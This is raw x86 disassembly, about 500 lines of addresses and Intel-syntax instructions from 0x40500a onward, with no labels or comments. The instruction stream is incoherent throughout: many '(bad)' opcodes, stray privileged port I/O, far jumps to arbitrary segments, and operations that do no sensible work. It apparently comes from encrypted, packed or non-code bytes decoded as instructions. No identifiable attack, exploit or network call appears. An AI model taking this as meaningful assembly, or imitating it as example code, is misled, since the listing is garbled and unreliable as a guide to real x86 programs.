  40500a:	xchg   edx,eax
  40500b:	in     al,0x9f
  40500d:	mov    ch,0x6d
  40500f:	clc    
  405010:	fs std 
  405012:	clc    
  405013:	sbb    eax,0x59fbb534
  405018:	sub    BYTE PTR ds:0x26b803f4,ch
  40501e:	push   ebx
  40501f:	mov    esp,0xaf1dfc6b
  405024:	adc    ebp,DWORD PTR [edx]
  405026:	std    
  405027:	xor    al,0x56
  405029:	and    edi,DWORD PTR [edi-0x515ef381]
  40502f:	mov    ebp,0x1c1dbf4f
  405034:	mov    DWORD PTR [eax],edi
  405036:	or     DWORD PTR [esi-0x40],esp
  405039:	adc    al,0x8a
  40503b:	loopne 0x405032
  40503d:	loope  0x405019
  40503f:	outs   dx,BYTE PTR ds:[esi]
  405040:	out    0x3e,al
  405042:	jno    0x405073
  405044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405045:	or     BYTE PTR [ebx+ebp*4-0x2e],dh
  405049:	mov    DWORD PTR [edx+0x1],edx
  40504c:	retf   0x8f9f
  40504f:	push   eax
  405050:	xchg   edi,eax
  405051:	push   edx
  405052:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405053:	mov    ecx,0xeca5b3e9
  405058:	aaa    
  405059:	ins    BYTE PTR es:[edi],dx
  40505a:	es ins BYTE PTR es:[edi],dx
  40505c:	jbe    0x40501d
  40505e:	std    
  40505f:	pop    ecx
  405060:	mov    edx,0x89355f5f
  405065:	fwait
  405066:	ror    DWORD PTR [ecx-0x133ea1fe],cl
  40506c:	repnz out 0x38,eax
  40506f:	shl    BYTE PTR [edi-0x1d],cl
  405072:	bound  edi,QWORD PTR [eax+eiz*4]
  405075:	lods   al,BYTE PTR ds:[esi]
  405076:	adc    eax,0x145ae9f9
  40507b:	jns    0x4050de
  40507d:	and    BYTE PTR [eax+ebx*4-0x76],dh
  405081:	jge    0x4050dc
  405083:	ret    
  405084:	daa    
  405085:	stos   DWORD PTR es:[edi],eax
  405086:	inc    ebx
  405087:	cmp    ebp,DWORD PTR ds:0x9672384e
  40508d:	cmp    ch,BYTE PTR ds:0x219bd13f
  405093:	mov    dh,0x3e
  405095:	mov    ebp,ss
  405097:	mov    ebp,0xe099c80f
  40509c:	mov    esi,esp
  40509e:	inc    edi
  40509f:	mov    ds:0x95d9113b,eax
  4050a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050a5:	mov    esp,0xa5f33c6d
  4050aa:	fdiv   QWORD PTR [ebx+0x52c46d29]
  4050b0:	fiadd  WORD PTR [ebx]
  4050b2:	or     eax,ebp
  4050b4:	leave  
  4050b5:	out    dx,eax
  4050b6:	sub    DWORD PTR [esi],esp
  4050b8:	pop    esp
  4050b9:	cmp    eax,0xbd19bc73
  4050be:	xchg   ebx,eax
  4050bf:	loope  0x405073
  4050c1:	jle    0x4050e9
  4050c3:	jmp    0xed1b:0x73fb533f
  4050ca:	mov    gs,WORD PTR ds:0x1b47e64
  4050d0:	nop
  4050d1:	mov    edx,0x1e51845f
  4050d6:	(bad)  
  4050d7:	pop    edi
  4050d8:	inc    ebp
  4050d9:	(bad)  
  4050da:	adc    eax,0x44261f8b
  4050df:	or     eax,0xe69b328d
  4050e4:	dec    eax
  4050e5:	loopne 0x405150
  4050e7:	push   ebp
  4050e8:	pop    ss
  4050e9:	jmp    FWORD PTR [ecx+ebp*2-0x6ef8f67a]
  4050f0:	cmp    al,0xda
  4050f2:	push   eax
  4050f3:	jmp    0x4050c7
  4050f5:	mov    ebp,0xd0a0abf6
  4050fa:	fnstsw WORD PTR [eax+0x5a]
  4050fd:	sub    DWORD PTR [ecx+0x671603a8],0xc0e9f578
  405107:	xor    BYTE PTR [esi-0x63],ah
  40510a:	aad    0xca
  40510c:	jecxz  0x405105
  40510e:	pop    edi
  40510f:	pop    edi
  405110:	mov    DWORD PTR [esi-0x7f59b443],edi
  405116:	jl     0x4050a3
  405118:	daa    
  405119:	bnd ja 0x4050e5
  40511c:	js     0x405127
  40511e:	aaa    
  40511f:	pop    esi
  405120:	pop    edx
  405121:	jmp    0x9c66:0xaa6f2c7a
  405128:	pop    ebp
  405129:	push   DWORD PTR [edi+0x321bf929]
  40512f:	adc    eax,0x94768c76
  405134:	jo     0x405125
  405136:	push   edi
  405137:	iret   
  405138:	sub    eax,0xf0995850
  40513d:	int    0x5d
  40513f:	mov    al,BYTE PTR [edx+ebx*8-0x25]
  405143:	(bad)  
  405144:	push   esp
  405145:	(bad)  
  405147:	jo     0x40512c
  405149:	inc    ebx
  40514a:	cmp    BYTE PTR [eax+esi*4],0xff
  40514e:	mov    dh,0x73
  405150:	and    eax,eax
  405152:	jns    0x4051ce
  405154:	xor    al,0x2b
  405156:	inc    esp
  405157:	inc    edi
  405158:	xchg   ecx,eax
  405159:	cmp    eax,0x465d4e85
  40515e:	mov    eax,ds:0x859ad22b
  405163:	das    
  405164:	jmp    0x4051c9
  405166:	push   ecx
  405167:	lock xchg esp,eax
  405169:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40516a:	sub    ebx,DWORD PTR [ebx]
  40516c:	mov    dh,0x4
  40516e:	push   edi
  40516f:	das    
  405170:	push   es
  405171:	ret    0xa42f
  405174:	pop    ecx
  405175:	adc    eax,0x693e6346
  40517a:	sub    eax,0x25015ab8
  40517f:	das    
  405180:	sub    BYTE PTR [ebx],dl
  405182:	mov    dh,0xb2
  405184:	xor    eax,0x7b8bc62f
  405189:	daa    
  40518a:	adc    al,cl
  40518c:	shl    DWORD PTR [esi],0x5c
  40518f:	pop    ebx
  405190:	ins    DWORD PTR es:[edi],dx
  405191:	idiv   BYTE PTR [eax-0x3b]
  405194:	pop    ds
  405195:	adc    cl,dh
  405197:	rcr    BYTE PTR [edi*1-0xd47140e],1
  40519e:	adc    DWORD PTR [ebx-0x495245f3],edi
  4051a4:	push   ecx
  4051a5:	pop    esp
  4051a6:	popa   
  4051a7:	xchg   ebp,eax
  4051a8:	cld    
  4051a9:	xchg   edi,eax
  4051aa:	cmp    DWORD PTR [edi],ecx
  4051ac:	cmp    eax,0x83ea84c9
  4051b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051b2:	call   0xd832:0x9156ee8e
  4051b9:	push   eax
  4051ba:	jae    0x40522b
  4051bc:	stos   BYTE PTR es:[edi],al
  4051bd:	popf   
  4051be:	push   ss
  4051bf:	sub    BYTE PTR [edi-0x4309e194],ah
  4051c5:	adc    BYTE PTR es:[edi-0x1c08eab],al
  4051cc:	clc    
  4051cd:	push   ecx
  4051ce:	pop    ss
  4051cf:	adc    eax,0xf5487d65
  4051d4:	in     al,0x3
  4051d6:	xchg   edi,eax
  4051d7:	push   edx
  4051d8:	dec    edi
  4051d9:	ret    0xd3
  4051dc:	xlat   BYTE PTR ds:[ebx]
  4051dd:	jae    0x40522c
  4051df:	or     ecx,DWORD PTR [ebx-0x1607e417]
  4051e5:	mov    ds:0x375eab19,eax
  4051ea:	test   eax,0xbc4d65b9
  4051ef:	push   ebp
  4051f0:	push   es
  4051f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051f2:	imul   ebp,DWORD PTR [ebx+0x5686a64c],0x7ec29ba7
  4051fc:	push   esp
  4051fd:	dec    ebp
  4051fe:	xor    eax,0x1960f913
  405203:	dec    DWORD PTR [ebx+0x20f04b84]
  405209:	push   ds
  40520a:	pop    edx
  40520b:	lahf   
  40520c:	(bad)  
  40520e:	loopne 0x4051c0
  405210:	loope  0x4051f0
  405212:	nop
  405213:	js     0x4051ec
  405215:	and    DWORD PTR [edx],ebx
  405217:	dec    esp
  405218:	add    DWORD PTR [eax-0x2d331363],ecx
  40521e:	imul   edi,eax,0xffffffee
  405221:	add    DWORD PTR [esi-0x19],edx
  405224:	out    0x78,al
  405226:	es jl  0x40522d
  405229:	ds bsr eax,edi
  40522d:	xchg   ebx,eax
  40522e:	pop    ds
  40522f:	push   0x12
  405231:	cmp    ecx,esp
  405233:	jg     0x405242
  405235:	fdiv   QWORD PTR [ebx+0x14f27541]
  40523b:	mul    BYTE PTR [ecx-0x1d]
  40523e:	add    al,0x71
  405240:	cwde   
  405241:	push   eax
  405242:	popa   
  405243:	pop    esp
  405244:	mov    ds:0x6801f4e5,al
  405249:	pop    ds
  40524a:	pop    ss
  40524b:	inc    ebp
  40524c:	jecxz  0x40525b
  40524e:	mov    bl,0xfc
  405250:	ja     0x4051dd
  405252:	cmp    eax,0x71a3f2b1
  405257:	enter  0xf2b4,0x92
  40525b:	mov    eax,ds:0xb7ae41e8
  405260:	mov    esp,0xbf7dd2df
  405265:	arpl   dx,sp
  405267:	mov    dl,0x89
  405269:	aaa    
  40526a:	loop   0x405292
  40526c:	stos   DWORD PTR es:[edi],eax
  40526d:	mov    ebp,0xb84bd74f
  405272:	push   ecx
  405273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405274:	test   edx,esi
  405276:	fcomp  DWORD PTR [eax-0x79]
  405279:	sar    BYTE PTR [ecx-0x23],0xb3
  40527d:	cmp    al,0xae
  40527f:	and    BYTE PTR [eax],ch
  405281:	xor    cl,BYTE PTR [eiz*2+0x43d88051]
  405288:	mov    ds:0xb8f98c35,al
  40528d:	stos   DWORD PTR es:[edi],eax
  40528e:	stos   BYTE PTR es:[edi],al
  40528f:	setne  al
  405292:	cs push 0x5b
  405295:	fnsave [edx-0x77]
  405298:	sub    BYTE PTR [eax],dh
  40529a:	jp     0x40524c
  40529c:	pop    ebx
  40529d:	adc    bh,bl
  40529f:	mov    WORD PTR ds:0x6fe111ec,fs
  4052a5:	xchg   ebp,eax
  4052a6:	xchg   esp,eax
  4052a7:	xor    cl,ch
  4052a9:	lock (bad) 
  4052ab:	jge    0x405296
  4052ad:	bound  esp,QWORD PTR [ebp-0x16]
  4052b0:	in     eax,dx
  4052b1:	jle    0x40525b
  4052b3:	xchg   ebp,eax
  4052b4:	ret    
  4052b5:	loopne 0x405265
  4052b7:	je     0x405337
  4052b9:	fwait
  4052ba:	das    
  4052bb:	push   edx
  4052bc:	push   0xf31ccb18
  4052c1:	ficomp WORD PTR [esi]
  4052c3:	push   ecx
  4052c4:	shr    BYTE PTR [esi],0x33
  4052c7:	or     al,0x53
  4052c9:	jmp    0x405290
  4052cb:	ds call 0xc5a38a0a
  4052d1:	sti    
  4052d2:	jl     0x405290
  4052d4:	loope  0x4052aa
  4052d6:	lds    esi,FWORD PTR [edx]
  4052d8:	dec    ebx
  4052d9:	aas    
  4052da:	jb     0x4052fc
  4052dc:	xor    bl,BYTE PTR [ebp-0x44513e07]
  4052e2:	ins    BYTE PTR es:[edi],dx
  4052e3:	push   cs
  4052e4:	(bad)  
  4052e5:	out    0x51,eax
  4052e7:	leave  
  4052e8:	jecxz  0x405332
  4052ea:	mov    al,ds:0x19a5fed9
  4052ef:	dec    ebx
  4052f0:	sbb    dl,BYTE PTR [ecx+eax*1-0x47]
  4052f4:	std    
  4052f5:	sub    bl,BYTE PTR [edx]
  4052f7:	mov    dl,0xcb
  4052f9:	mov    al,ds:0x2a5c4626
  4052fe:	repnz pushf 
  405300:	addr16 leave 
  405302:	or     dl,BYTE PTR [edx]
  405304:	ins    DWORD PTR es:[edi],dx
  405305:	push   ds
  405306:	add    eax,0x18a1ffcf
  40530b:	scas   eax,DWORD PTR es:[edi]
  40530c:	retf   
  40530d:	push   edx
  40530e:	pop    ds
  40530f:	iret   
  405310:	or     al,0x8d
  405312:	dec    edx
  405313:	and    DWORD PTR [ecx+0x40],edx
  405316:	mov    dl,al
  405318:	loope  0x4052dc
  40531a:	mov    eax,ds:0xcfff2d69
  40531f:	pop    esp
  405320:	and    eax,0xd47fc930
  405325:	fwait
  405326:	xlat   BYTE PTR ds:[ebx]
  405327:	fwait
  405328:	pop    ecx
  405329:	shr    dh,1
  40532b:	arpl   WORD PTR [ebp+ebx*2-0x3c806602],si
  405332:	dec    esi
  405333:	ficomp DWORD PTR [edx+ecx*1-0x3e]
  405337:	cmp    al,0x38
  405339:	ds sub al,0xe1
  40533c:	sahf   
  40533d:	push   ebx
  40533e:	and    al,cl
  405340:	data16 out dx,al
  405342:	dec    esp
  405343:	mov    bh,0x50
  405345:	sub    BYTE PTR [ecx+0x401c42c3],bl
  40534b:	inc    DWORD PTR [ecx+0x45f14432]
  405351:	xchg   BYTE PTR [esp+ecx*4-0x48],ah
  405355:	cs pusha 
  405357:	js     0x4052eb
  405359:	mov    edi,0xddf89a47
  40535e:	adc    al,0x63
  405360:	bound  ecx,QWORD PTR [esi-0x11]
  405363:	int    0x45
  405365:	scas   eax,DWORD PTR es:[edi]
  405366:	inc    ebx
  405367:	or     eax,0x3fc617f4
  40536c:	adc    edx,DWORD PTR [ecx-0x2f2603b3]
  405372:	lods   eax,DWORD PTR ds:[esi]
  405373:	(bad)  
  405374:	je     0x4053c4
  405376:	fimul  WORD PTR [edi]
  405378:	xchg   edx,eax
  405379:	repnz lods al,BYTE PTR ds:[esi]
  40537b:	fsubr  DWORD PTR [edi]
  40537d:	jmp    0xdc8db598
  405382:	add    BYTE PTR es:[edx+eiz*2],al
  405386:	in     al,dx
  405387:	pop    ebp
  405388:	in     al,0x20
  40538a:	and    DWORD PTR [edi-0x68],eax
  40538d:	lods   eax,DWORD PTR ds:[esi]
  40538e:	rcl    BYTE PTR [esi-0xd],cl
  405391:	test   eax,edx
  405393:	mov    ch,0x56
  405395:	pop    edx
  405396:	fimul  WORD PTR [ebx]
  405398:	adc    eax,0xb203f712
  40539d:	jns    0x405374
  40539f:	or     DWORD PTR [edi+0x17d931e6],esi
  4053a5:	loope  0x405378
  4053a7:	das    
  4053a8:	xchg   esi,eax
  4053a9:	stos   BYTE PTR es:[edi],al
  4053aa:	pop    ecx
  4053ab:	cmp    al,0x43
  4053ad:	mov    al,0x12
  4053af:	inc    esp
  4053b0:	inc    edx
  4053b1:	ins    DWORD PTR es:[edi],dx
  4053b2:	clc    
  4053b3:	mov    dl,0xc2
  4053b5:	into   
  4053b6:	loopne 0x405393
  4053b8:	pop    ds
  4053b9:	hlt    
  4053ba:	push   ss
  4053bb:	or     cl,BYTE PTR [ebx-0x6c]
  4053be:	sbb    eax,0x2e8f70a3
  4053c3:	shr    BYTE PTR [ecx+eax*2],1
  4053c6:	mov    BYTE PTR [eax-0x71826c21],ah
  4053cc:	aad    0xf8
  4053ce:	pusha  
  4053cf:	and    eax,0x324f2a34
  4053d4:	iret   
  4053d5:	sahf   
  4053d6:	ins    BYTE PTR es:[edi],dx
  4053d7:	loopne 0x4053e5
  4053d9:	inc    esp
  4053da:	inc    edx
  4053db:	adc    DWORD PTR [edi+0xe],esi
  4053de:	call   0xbb913982
  4053e3:	and    ebp,edi
  4053e5:	sub    eax,DWORD PTR [ecx]
  4053e7:	je     0x40541a
  4053e9:	adc    eax,0xee694a1e
  4053ee:	outs   dx,BYTE PTR ds:[esi]
  4053ef:	arpl   WORD PTR [eax],sp
  4053f1:	pop    esi
  4053f2:	popa   
  4053f3:	dec    edx
  4053f4:	rol    eax,0x8a
  4053f7:	popf   
  4053f8:	xor    DWORD PTR [edi],0xfffffff0
  4053fb:	fldenv [eax]
  4053fd:	clc    
  4053fe:	mov    BYTE PTR [edx+0x77],bl
  405401:	add    eax,0x2c88b67f
  405406:	xchg   ebx,eax
  405407:	sbb    cl,ah
  405409:	outs   dx,DWORD PTR ds:[esi]
  40540a:	dec    edx
  40540b:	fscale 
  40540d:	pushf  
  40540e:	cdq    
  40540f:	sbb    DWORD PTR [edx],esp
  405411:	imul   esi,DWORD PTR [edi-0x2c],0x4a
  405415:	test   al,0xf5
  405417:	sub    ebp,DWORD PTR [edi+0x5486bfd4]
  40541d:	not    ecx
  40541f:	cmp    DWORD PTR [ebp+0x62],esi
  405422:	xor    bl,BYTE PTR [eax+esi*4]
  405425:	cmp    eax,0x2f47781b
  40542a:	add    eax,0x85b05570
  40542f:	pop    esi
  405430:	mov    ah,0x6a
  405432:	std    
  405433:	mov    WORD PTR [edx],gs
  405435:	jae    0x40541c
  405437:	add    dh,BYTE PTR [ebx-0x5bd10276]
  40543d:	clc    
  40543e:	imul   edx,DWORD PTR [edi+0x1a],0x42
  405442:	into   
  405443:	es cmp al,0x66
  405446:	retf   0x1b0c
  405449:	pop    edi
  40544a:	adc    bh,dl
  40544c:	jmp    0x2a0f3fbe
  405451:	adc    BYTE PTR [eax-0x70],ah
  405454:	ret    
  405455:	xchg   DWORD PTR [eax+0x20],ebx
  405458:	mov    dh,0x77
  40545a:	jmp    0xedb0a46f
  40545f:	inc    esp
  405460:	sub    esi,DWORD PTR [edx]
  405462:	mov    dl,0x24
  405464:	ret    0x1acd
  405467:	lods   eax,DWORD PTR ds:[esi]
  405468:	xor    ebx,esi
  40546a:	dec    esi
  40546b:	xchg   ebx,eax
  40546c:	sub    BYTE PTR [edx+0x26b01380],0xbc
  405473:	lods   eax,DWORD PTR ds:[esi]
  405474:	dec    dx
  405476:	jnp    0x40544f
  405478:	retf   
  405479:	mov    al,0x8a
  40547b:	outs   dx,BYTE PTR ds:[esi]
  40547c:	pop    esi
  40547d:	jmp    0xa06c:0x1a819d96
  405484:	pop    ebx
  405485:	push   eax
  405486:	jbe    0x405414
  405488:	je     0x405495
  40548a:	fdivr  DWORD PTR [esi+0x377d06b5]
  405490:	imul   edx,DWORD PTR [eax+0x133467ac],0x92dae8a6
  40549a:	cmp    eax,0x52e8a22f
  40549f:	jbe    0x405473
  4054a1:	not    BYTE PTR [esi]
  4054a3:	xor    edx,DWORD PTR [ebx+ebp*8-0x40360371]
  4054aa:	jne    0x405512
  4054ac:	(bad)  
  4054ae:	andnps xmm7,XMMWORD PTR [edx+0x323976f5]
  4054b5:	mov    esp,0x6c3622cb
  4054ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054bb:	cdq    
  4054bc:	adc    edx,DWORD PTR [edx]
  4054be:	shrd   DWORD PTR ds:0xb8b1cb95,edx,cl
  4054c5:	sub    DWORD PTR [edi-0x39],esp
  4054c8:	ins    DWORD PTR es:[edi],dx
  4054c9:	mov    dh,0x28
  4054cb:	inc    esi
  4054cc:	or     BYTE PTR [eax+0x6d],cl
  4054cf:	xor    edi,ecx
  4054d1:	iret   
  4054d2:	(bad)  
  4054d3:	call   0x696d150
  4054d8:	add    BYTE PTR [edi+0x1],al
  4054db:	idiv   DWORD PTR [eax+0x6c0001ac]
  4054e1:	retf   0x385d
  4054e4:	push   ecx
  4054e5:	mov    esi,0x78ae6136
  4054ea:	outs   dx,DWORD PTR ds:[esi]
  4054eb:	aad    0x88
  4054ed:	hlt    
  4054ee:	das    
  4054ef:	mov    edx,0x89ef112b
  4054f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054f5:	sbb    BYTE PTR [eax+0x4e],0x64
  4054f9:	pop    ebp
  4054fa:	push   ds
  4054fb:	lahf   
  4054fc:	adc    eax,0x6626f1e4
  405501:	add    eax,0xf6b44b46
  405506:	fcom   DWORD PTR [esi+0x56]
  405509:	in     eax,dx
  40550a:	xor    ch,ch
  40550c:	aam    0x20
  40550e:	repz jge 0x4054ad
  405511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405512:	cmp    al,0xfd
  405514:	int3   
  405515:	sub    DWORD PTR [eax+ebp*1],esi
  405518:	cmp    edi,DWORD PTR [ebx-0x29a8b8db]
  40551e:	pop    es
  40551f:	pushf  
  405520:	test   BYTE PTR [ecx-0x1fb369ff],ah
  405526:	push   ebp
  405527:	and    DWORD PTR [edx+0x40f66173],0x56
  40552e:	fnstcw WORD PTR [ebp*2+0x2c2be69e]
  405535:	scas   al,BYTE PTR es:[edi]
  405536:	sub    al,0x6c
  405538:	loop   0x405501
  40553a:	xor    DWORD PTR [ebp+0x14],ebx
  40553d:	xchg   edi,eax
  40553e:	mov    ch,0x7f
  405540:	adc    eax,0xbb43665c
  405545:	inc    edi
  405546:	mov    dl,0x94
  405548:	hlt    
  405549:	fdivp  st(3),st
  40554b:	pmaddwd mm3,QWORD PTR [ebx]
  40554e:	mov    bl,0x77
  405550:	or     DWORD PTR ds:0x798ac756,esp
  405556:	pop    es
  405557:	div    BYTE PTR [esi]
  405559:	mov    al,0x9
  40555b:	pop    ds
  40555c:	fnstsw WORD PTR [esi+0x6190b68e]
  405562:	or     DWORD PTR [ebx-0x2a],ebx
  405565:	add    ebx,DWORD PTR [esi+0x41fc42df]
  40556b:	jg     0x4054f0
  40556d:	adc    al,dl
  40556f:	(bad)  
  405570:	imul   edx,eax,0x7
  405573:	pop    edx
  405574:	in     al,0x3c
  405576:	rcr    DWORD PTR [ebp-0x6f285228],cl
  40557c:	and    al,ch
  40557e:	rcr    edx,cl
  405580:	inc    ecx
  405581:	cwde   
  405582:	push   0xc3d9d066
  405587:	bnd jp 0x405522
  40558a:	(bad)  
  40558b:	mov    eax,ds:0xf8b71163
  405590:	jno    0x40555c
  405592:	fidivr WORD PTR [ebx-0x244cb721]
  405598:	popa   
  405599:	and    al,0x32
  40559b:	sub    DWORD PTR [ebx+0x4e817d79],ebx
  4055a1:	test   al,0xf2
  4055a4:	pop    es
  4055a5:	icebp  
  4055a6:	sti    
  4055a7:	and    BYTE PTR [eax-0x2e88b1fe],ch
  4055ad:	dec    esp
  4055ae:	cmp    al,0xc
  4055b0:	sbb    ecx,eax
  4055b2:	call   0xd18e8511
  4055b7:	in     al,0x83
  4055b9:	call   0xa393e7cb
  4055be:	cmp    eax,0x3ecbbe3e
  4055c3:	or     al,0x4b
  4055c5:	adc    DWORD PTR [bx+0x328e],edi
  4055ca:	adc    bl,al
  4055cc:	popa   
  4055cd:	cmp    BYTE PTR [edi],0xd2
  4055d0:	bound  esp,QWORD PTR [ebx-0xe64a3f]
  4055d6:	jl     0x405574
  4055d8:	aas    
  4055d9:	in     eax,dx
  4055da:	mov    esi,0x3c5b3876
  4055df:	mov    dl,0x87
  4055e1:	mov    al,ds:0x1eb115a4
  4055e6:	pop    ebx
  4055e7:	out    dx,al
  4055e8:	jecxz  0x4055fc
  4055ea:	or     al,0x36
  4055ec:	sub    bh,BYTE PTR [ebx-0x2b]
  4055ef:	sbb    BYTE PTR [edi+0x4da893b9],al
  4055f5:	imul   eax,DWORD PTR [ebp-0x112aeeb4],0x6c1f6695
  4055ff:	mov    al,0xdf
  405601:	xchg   edi,eax
  405602:	std    
  405603:	(bad)  
  405604:	sub    DWORD PTR [esi-0x20],edi
  405607:	popf   
  405608:	and    BYTE PTR [ebp-0x4c0694fb],0x50
  40560f:	ins    BYTE PTR es:[edi],dx
  405610:	mov    eax,0x4286b863
  405615:	inc    esp
  405616:	inc    eax
  405617:	dec    esp
  405618:	push   edx
  405619:	add    eax,DWORD PTR [eax-0x780d6a34]
  40561f:	cli    
  405620:	neg    BYTE PTR [esi]
  405622:	mov    eax,0xd9c567b5
  405627:	(bad)  
  405628:	sbb    al,0x7
  40562a:	stos   DWORD PTR es:[edi],eax
  40562b:	into   
  40562c:	push   edi
  40562d:	jp     0x405628
  40562f:	jmp    0x11a12e1d
  405634:	and    eax,0x88758581
  405639:	es repz repz lock aaa 
  40563e:	lods   eax,DWORD PTR ds:[esi]
  40563f:	jg     0x40569b
  405641:	sbb    ch,ah
  405643:	scas   al,BYTE PTR es:[edi]
  405644:	(bad)  
  405645:	(bad)  
  405646:	rcr    DWORD PTR [edx-0x47ff708a],1
  40564c:	push   ebx
  40564d:	mov    al,0x3d
  40564f:	mov    ch,0x84
  405651:	(bad)  
  405652:	pushf  
  405653:	cmc    
  405654:	test   eax,0x46080fb3
  405659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40565a:	mov    DWORD PTR [ebx+0x23317b99],ebp
  405660:	and    ch,BYTE PTR [eax+0x3e]
  405663:	adc    eax,0xfeb8c229
  405668:	imul   esp,DWORD PTR [ecx+0x17e112f4],0xd75a17df
  405672:	les    edx,FWORD PTR [edi-0x69bb581e]
  405678:	ss ins BYTE PTR es:[edi],dx
  40567a:	mov    al,ds:0x9bb74a51
  40567f:	cld    
  405680:	ret    0xe7ad
  405683:	out    dx,eax
  405684:	sub    al,0xd6
  405686:	or     eax,0x31718bec
  40568b:	jo     0x4056af
  40568d:	int    0xcc
  40568f:	nop
  405690:	mov    dh,0xca
  405693:	cs dec eax
  405695:	inc    ecx
  405696:	jns    0x4056e9
  405698:	fidiv  WORD PTR [ebx+0x48]
  40569b:	daa    
  40569c:	ins    DWORD PTR es:[edi],dx
  40569d:	idiv   edx
  40569f:	cld    
  4056a0:	addr16 test eax,0xd74e6c77
  4056a6:	jo     0x405672
  4056a8:	jmp    0xa950:0xea55151f
  4056af:	mov    edi,DWORD PTR [edx]
  4056b1:	lea    ebx,[edx-0x22]
  4056b4:	adc    DWORD PTR [ebp+0x5d39f990],edx
  4056ba:	gs push ebp
  4056bc:	sti    
  4056bd:	(bad)  
  4056be:	lods   al,BYTE PTR ds:[esi]
  4056bf:	and    ch,BYTE PTR [esi+0x614a6b94]
  4056c5:	lahf   
  4056c6:	adc    eax,0xaba70e17
  4056cb:	push   0x79357258
  4056d0:	push   es
  4056d1:	pop    esp
  4056d2:	jne    0x405728
  4056d4:	sub    al,0x9f
  4056d6:	call   0x5bad71a0
  4056db:	out    0xd4,eax
  4056dd:	mul    DWORD PTR [edx-0x49]
  4056e0:	push   ds
  4056e1:	jb     0x4056bf
  4056e3:	(bad)  
  4056e4:	icebp  
  4056e5:	cmp    esp,DWORD PTR [edx+0x0]
  4056e8:	lods   al,BYTE PTR ds:[esi]
  4056e9:	repz mov eax,0xc7a0a8b0
  4056ef:	test   BYTE PTR [ebx+0x70ae8898],ch
  4056f5:	std    
  4056f6:	(bad)  
  4056f7:	cld    
  4056f8:	push   0x7b8778ba
  4056fd:	sbb    esp,DWORD PTR [esp+ebp*4-0x48]
  405701:	xor    eax,DWORD PTR [eax+0x86a6bee]
  405707:	ficom  DWORD PTR [esi-0x25bd37a0]
  40570d:	mov    ch,0x8a
  40570f:	mov    dh,0xcd
  405711:	mov    bl,0x53
  405713:	and    al,0x92
  405715:	inc    ecx
  405716:	add    esi,DWORD PTR [ebx]
  405718:	sub    al,0x77
  40571a:	cmp    al,0xc6
  40571c:	inc    ebx
  40571d:	adc    ebx,DWORD PTR [eax+0x6f]
  405720:	fs aaa 
  405722:	pop    ebx
  405723:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405724:	fucomp st(0)
  405726:	or     dh,bh
  405728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405729:	cmc    
  40572a:	jmp    0x3a22fae
  40572f:	jno    0x405789
  405731:	pop    ds
  405732:	xchg   DWORD PTR [ebp+0x5e],ebx
  405735:	adc    al,0x9d
  405737:	adc    BYTE PTR [esp+esi*1-0x18],ch
  40573b:	inc    ecx
  40573c:	call   0x3d4da454
  405741:	push   ebx
  405742:	jle    0x4056d3
  405744:	fldcw  WORD PTR [ebp+0x51]
  405747:	dec    ecx
  405748:	jb     0x405761
  40574a:	leave  
  40574b:	ficom  DWORD PTR [edi]
  40574d:	outs   dx,DWORD PTR ss:[esi]
  40574f:	mov    ebx,0xb544598f
  405754:	aas    
  405755:	ds bnd je 0x40574b
  405759:	push   esi
  40575a:	cmp    al,BYTE PTR [edx+0x7e]
  40575d:	lock mov ebx,0xdf81374
  405764:	gs mov edi,0xdb88a148
  40576a:	fmul   QWORD PTR [esi+0x6c]
  40576d:	lea    esi,[ecx]
  40576f:	icebp  
  405770:	lea    edx,[si]
  405773:	dec    edx
  405774:	jbe    0x405775
  405776:	inc    ebp
  405777:	hlt    
  405778:	mov    ch,0xef
  40577a:	or     esp,DWORD PTR [ebx-0x24]
  40577d:	xchg   esp,eax
  40577e:	shr    BYTE PTR [ecx-0x7f],cl
  405781:	push   0x11
  405783:	mov    cl,0x2a
  405785:	mov    dl,0x64
  405787:	dec    ecx
  405788:	(bad)  
  405789:	scas   al,BYTE PTR es:[edi]
  40578a:	or     DWORD PTR [edi-0x3ad73c4],edi
  405790:	out    dx,al
  405791:	push   eax
  405792:	inc    ebp
  405793:	or     DWORD PTR [eax+0x68],esi
  405796:	cmc    
  405797:	sub    al,0x73
  405799:	loopne 0x4057b4
  40579b:	inc    edi
  40579c:	push   es
  40579d:	push   es
  40579e:	out    0x0,al
  4057a0:	jo     0x405765
  4057a2:	push   ds
  4057a3:	and    al,0x7e
  4057a5:	and    BYTE PTR [ecx-0x2f],bh
  4057a8:	adc    cl,BYTE PTR [ebx-0x6c40137f]
  4057ae:	and    BYTE PTR [esi-0x23cc4087],ch
  4057b4:	enter  0x33dd,0xdd
  4057b8:	jmp    0x93a86eb1
  4057bd:	pop    ebp
  4057be:	push   esi
  4057bf:	mov    cl,0x10
  4057c1:	xor    bh,BYTE PTR ds:0x5bbb8224
  4057c7:	inc    esi
  4057c8:	mov    al,ds:0x531b0035
  4057cd:	ins    DWORD PTR es:[edi],dx
  4057ce:	mov    ebp,0x5f023694
  4057d3:	adc    DWORD PTR [ebp-0x65],edx
  4057d6:	and    DWORD PTR [ebx],esp
  4057d8:	leave  
  4057d9:	add    DWORD PTR [ebx+ecx*1+0x66],edx
  4057dd:	mov    ah,0xa1
  4057df:	sub    BYTE PTR [ebp+edi*8+0x33],bl
  4057e3:	mov    bh,0xdd
  4057e5:	mov    esi,0xb3b4cd01
  4057ea:	jbe    0x405792
  4057ec:	mov    ah,0xbd
  4057ee:	jnp    0x40585c
  4057f0:	mov    esi,0xb22772b0
  4057f5:	xlat   BYTE PTR ds:[ebx]
  4057f6:	cmp    ah,BYTE PTR [eax+0x693cb09a]
  4057fc:	ficomp WORD PTR [edi]
  4057fe:	cdq    
  4057ff:	xor    ecx,DWORD PTR [eax]
  405801:	cmp    dh,0xf8
